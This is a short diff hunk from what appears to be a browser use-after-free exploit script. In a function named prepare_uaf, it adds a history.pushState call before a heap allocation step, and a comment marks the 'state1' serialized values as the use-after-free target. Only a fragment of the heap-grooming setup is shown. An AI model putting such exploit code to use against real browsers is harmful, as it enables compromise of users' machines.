@@ -151,7 +151,7 @@ function prepare_uaf() {
             fsets.push(fset);
         }
     }
-
+    history.pushState('state0', ''); // new line
     alloc_fs(fsets, num_fsets);
 
     // the "state1" SSVs is what we will UaF
